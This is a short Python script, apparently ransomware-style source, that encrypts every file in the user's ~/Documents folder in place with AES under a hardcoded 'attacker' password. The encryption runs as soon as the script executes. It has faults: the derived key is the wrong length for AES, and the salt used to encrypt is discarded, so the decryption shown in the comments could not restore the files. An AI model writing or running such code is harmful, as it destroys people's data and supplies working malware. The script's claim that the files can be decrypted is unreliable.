import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import base64
import os

# Generate a key from a password (attacker's key)
def generate_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

# Encrypt a file with the given key
def encrypt_file(file_path: str, key: bytes):
    with open(file_path, "rb") as file:
        data = file.read()
    
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = iv + encryptor.update(data) + encryptor.finalize()

    with open(file_path, "wb") as file:
        file.write(encrypted_data)
    print(f"Encrypted {file_path}")

# Decrypt a file with the given key
def decrypt_file(file_path: str, key: bytes):
    with open(file_path, "rb") as file:
        data = file.read()
    
    iv = data[:16]
    encrypted_data = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    with open(file_path, "wb") as file:
        file.write(decrypted_data)
    print(f"Decrypted {file_path}")

# Encrypt all files in the "Documents" directory
def encrypt_documents_directory(password: str):
    documents_path = os.path.expanduser("~/Documents")
    salt = os.urandom(16)
    key = generate_key(password, salt)
    for root, dirs, files in os.walk(documents_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    print("All files in the Documents directory have been encrypted.")

# Decrypt all files in the "Documents" directory
def decrypt_documents_directory(password: str, salt: bytes):
    documents_path = os.path.expanduser("~/Documents")
    key = generate_key(password, salt)
    for root, dirs, files in os.walk(documents_path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)
    print("All files in the Documents directory have been decrypted.")

# Example usage
attacker_password = "attacker_secret_password"
salt = os.urandom(16)

# Encrypt files
encrypt_documents_directory(attacker_password)

# To decrypt files, run:
# decrypt_documents_directory(attacker_password, salt)
